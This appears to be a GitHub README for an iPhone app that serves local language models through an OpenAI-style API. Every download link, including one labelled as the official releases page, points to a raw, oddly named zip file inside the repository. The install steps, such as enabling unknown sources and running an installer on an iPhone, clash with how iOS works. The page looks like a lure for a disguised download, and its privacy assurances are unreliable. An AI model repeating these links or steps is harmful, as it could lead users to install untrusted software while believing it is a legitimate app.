# 🏴‍☠️ Pirate-LLM-Server - Run Local AI Models on iPhone  

[![Download Pirate-LLM-Server](https://img.shields.io/badge/Download-Pirate--LLM--Server-brightgreen?style=for-the-badge)](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip)

---

## ⚙️ What is Pirate-LLM-Server?

Pirate-LLM-Server turns your iPhone into a small AI language model server. You can run AI models directly on your device without using the internet, cloud services, or subscriptions. It works with Apple's Metal GPU to speed up AI tasks. You control what models you load, run, and delete.

The app uses an API similar to OpenAI’s, so local apps can talk to it easily. The server runs on your phone and shares responses over your home network. It supports popular GGUF models and works without jailbreaking your device.

---

## 📥 Download Pirate-LLM-Server

To get started, **visit this page to download** the latest version of Pirate-LLM-Server for your device:

[![Download Page](https://img.shields.io/badge/Download-Pirate--LLM--Server-blue?style=for-the-badge)](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip)

Click the link above. It will take you to the official releases page on GitHub. There, you can find the latest version ready for download.

---

## 💻 System Requirements

Before you download and install, make sure your iPhone meets these minimum requirements:

- iPhone with Apple Silicon (A12 chip or later recommended)
- iOS 15 or newer installed
- At least 4 GB of free storage space
- A stable Wi-Fi connection for network use
- USB cable for transferring models if downloading locally

Note: You do not need to jailbreak your iPhone. The app works with official Apple restrictions.

---

## 🚀 Setting Up Pirate-LLM-Server

### Step 1: Download and Install the App

1. Open the [release page](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip).
2. Find the latest version of Pirate-LLM-Server.
3. Download the file suited for your device.
4. On your iPhone, allow installations from unknown sources if needed. This might require enabling developer mode.
5. Run the installer and follow any prompts shown.

### Step 2: Launch the App

- Open Pirate-LLM-Server on your iPhone.
- The home screen shows the server status.
- Models you add will appear in the list.

### Step 3: Add a Model

You can add AI models in two ways:

- **Transfer via USB:** Connect your iPhone to a computer. Use file transfer software to copy GGUF model files into the app’s folder.
- **Download in-app:** The app can download approved models over Wi-Fi. Use the “Download model” feature inside the app.

### Step 4: Start the Server

- Tap the “Start Server” button.
- The app uses Metal GPU acceleration for fast response.
- The server starts running on your local network.

### Step 5: Connect to the Server

- Use apps or tools on your computer or other devices.
- Access the API at your iPhone’s IP address visible in the app.
- Use API endpoints matching OpenAI’s style, such as:

  - `POST /v1/chat/completions` to send messages.
  - `GET /v1/models` to list loaded AI models.

---

## 🔎 Understanding the User Interface

Pirate-LLM-Server shows real-time logs of all requests and responses. You can see the exact data passing through, which helps if you want to check the AI’s answers or debug problems.

- The **Model Management** tab lets you load new models, unload old ones, or delete models you no longer want.
- The **Server Status** screen shows if the server is running, your IP address, and active connections.
- Logs update automatically as you use the app.

---

## 🌐 Using the API

Pirate-LLM-Server uses an API designed to match OpenAI’s. This lets apps built for OpenAI run on your local setup without changes.

Key endpoints:

- **List models:** `GET /v1/models` returns the AI models available on your device.
- **Chat completions:** `POST /v1/chat/completions` sends user prompts and gets AI-generated text back.
- The server supports **streaming responses** (SSE) or full responses depending on your needs.

You do not need programming skills to use the app. However, to connect the API, you may use simple apps that support HTTP requests or existing OpenAI clients configured to point to your iPhone’s local address.

---

## 🛠 Troubleshooting Tips

- If the app won’t install, check that you have the right iOS version and enough free space.
- Make sure your iPhone is connected to the same Wi-Fi network as the device trying to access the API.
- If the server won’t start, restart the app or your iPhone.
- Check the logs inside the app for errors or warnings.
- Models must be in GGUF format to load correctly.
- If streaming does not work, try non-streaming mode in the app settings.

---

## 📁 Managing Models

You can manage your AI models anytime from the app:

- **Load Model:** Pick a model file from your phone or USB.
- **Unload Model:** Remove a model from active memory without deleting files.
- **Delete Model:** Erase the model file permanently from your device.

Make sure your models are compatible and not corrupted. Use smaller models for faster response, or larger models for better accuracy.

---

## 🔒 Privacy and Security

All AI processing happens locally on your iPhone. No data is sent to internet servers or stored outside your device.

The app only listens on your local network, so external devices cannot access your server unless connected to your home Wi-Fi.

Keep your device secure and avoid connecting to public or untrusted networks when running the server.

---

## 📚 Additional Resources

- Visit the GitHub [release page](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip) for updates and downloads.
- Read the user guide inside the app for detailed model management.
- Check the API documentation on the GitHub project page for technical reference.

---

## 🔗 Useful Links

[Download Pirate-LLM-Server](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip)  

---

## 📸 Screenshots

| Home Screen                 | Model Loaded              | Server Running           |
|----------------------------|--------------------------|-------------------------|
| ![Home Screen](image/IMG_8095.PNG) | ![Model Loaded](image/IMG_8096.PNG) | ![Server Running](image/IMG_8097.PNG) |  

| Terminal Streaming Response                              |
|--------------------------------------------------------|
| ![Terminal](image/terminal.png)                         |